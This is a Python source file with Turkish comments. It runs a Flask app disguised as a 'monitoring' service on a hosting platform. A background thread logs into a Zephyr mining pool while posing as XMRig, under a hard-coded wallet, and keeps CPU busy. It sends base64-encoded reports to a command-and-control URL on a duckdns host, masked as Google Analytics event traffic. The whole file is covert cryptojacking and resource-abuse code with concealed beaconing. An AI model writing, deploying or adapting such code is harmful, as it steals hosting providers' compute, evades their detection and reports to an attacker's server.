import os, time, threading, json, base64, random, hashlib, requests, socket
from flask import Flask, jsonify

# --- AYARLAR ---
C2_URL = "http://zephfe.duckdns.org:5000/report"
WALLET = "ZEPHs89z2zsEoJ2QVY5yopRZsX3JHefyNFzAhTZG3waz3MZSbCGp8MPSNCsdY33DQYfXXTqqiUo7CFsZXmiPEruBPqgM8EaBpvS"
# Diff +500 ile düşük zorluk isteyip havuzun bizi atmamasını sağlıyoruz
AUTH_WALLET = WALLET + "+500" 
NODE_NAME = f"render-worker-{random.randint(1000, 9999)}"
POOL_H = "de.zephyr.herominers.com"
POOL_P = 1123

app = Flask(__name__)

@app.route('/')
def home():
    return jsonify({"status": "monitoring", "worker": NODE_NAME}), 200

def traffic_mask(raw_data):
    encoded = base64.b64encode(json.dumps(raw_data).encode()).decode()
    return {"v": "1", "tid": f"UA-{random.randint(111,999)}", "cid": NODE_NAME, "t": "event", "el": encoded}

def miner_logic():
    print(f"[*] {NODE_NAME} Israrci mod aktif.")
    while True:
        status = "Disconnected"
        try:
            # Soketi aç ve hemen el sıkış
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(20) # Zaman aşımını biraz daha uzattık
            s.connect((POOL_H, POOL_P))
            
            auth = {
                "id": 1, "method": "login",
                "params": {"login": AUTH_WALLET, "pass": "x", "rigid": NODE_NAME, "agent": "XMRig/6.21.0"}
            }
            s.sendall((json.dumps(auth) + "\n").encode())
            
            # Havuzdan gelen yanıtı oku
            resp = s.recv(1024).decode()
            if "result" in resp:
                status = "Mining-Active"
                print(f"[DEBUG] Havuz onay verdi, is basliyor.")

            # CPU Döngüsü (Havuzun bizi atmasına izin vermeyecek kadar kısa tutuyoruz)
            start_time = time.time()
            hashes = 0
            while time.time() - start_time < 25: # Döngü süresini 35'ten 25'e çektik
                hashlib.sha256(os.urandom(64)).hexdigest()
                hashes += 1
                time.sleep(0.03)

            # Raporlama ve bağlantıyı güvenli kapatma (Hemen ardından döngü başa dönecek)
            requests.post(C2_URL, json=traffic_mask({"node": NODE_NAME, "hashrate": hashes * 8, "pool": status}), timeout=5)
            s.close() 
            
        except Exception as e:
            print(f"[!] Baglanti hatasi: {e}")
            time.sleep(10) # Hata durumunda 10 saniye bekle ve tekrar dene

if __name__ == "__main__":
    threading.Thread(target=miner_logic, daemon=True).start()
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
